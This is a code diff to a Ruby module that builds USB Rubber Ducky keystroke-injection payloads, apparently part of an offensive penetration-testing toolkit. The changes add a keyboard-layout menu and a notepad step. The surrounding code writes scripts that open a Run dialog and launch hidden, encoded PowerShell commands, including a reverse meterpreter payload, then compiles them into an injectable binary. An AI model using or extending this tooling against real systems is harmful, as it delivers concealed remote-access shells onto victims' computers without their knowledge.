@@ -11,6 +11,9 @@ module DuckySetUp
   def low_priv
     "DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500"
   end
+  def notepad_hex
+    "DELAY 2000\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 500"
+  end
   def ducky_meterpreter_low(encoded_command)
     File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
   end
@@ -48,11 +51,29 @@ module DuckySetUp
     File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
   end
   def ducky_hex_low(encoded_command)
-    File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+    File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{notepad_hex}\n#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+  end
+  def language_select
+    languages = { :'1' => 'us.properties', :'2' => 'be.properties', :'3' => 'it.properties', :'4' => 'dk.properties', :'5' => 'es.properties', :'6' => 'uk.properties', :'7' => 'sv.properties' ,
+                  :'8' => 'ru.properties', :'9' => 'pt.properties', :'10' => 'de.properties', :'11' => 'no.properties', :'12' => 'fr.properties'}
+    user_pick = Readline.readline("#{get_input("Would you like to change the keyboard layout?[yes/no] ")}",true)
+    if user_pick == 'no' or user_pick == ''
+      return languages[:"#{1}"]
+    else
+      language_pick = language_menu
+      if language_pick == nil
+        print_error("Not a valid choice using #{languages[:"#{1}"]}\n")
+        return languages[:"#{1}"]
+      else
+        print_info("Using #{languages[:"#{language_pick}"]}\n")
+        return languages[:"#{language_pick}"]
+      end
+    end
   end
   def compile_ducky(file_name)
+    language = language_select
     print_info("Creating Bin File!\n")
-    output = `java -jar #{duck_encode_file}encoder.jar -i #{text_path}#{file_name} -o #{file_root}/inject.bin 2>&1`
+    output = `java -jar #{duck_encode_file}encoder.jar -i #{text_path}#{file_name} -o #{file_root}/inject.bin -l #{language_dir}#{language} 2>&1`
     if output =~ /Exception/
       print_error("Wrong Version of Java\n")
       print_info("Run update-alternatives --config java and select Java 7\n")
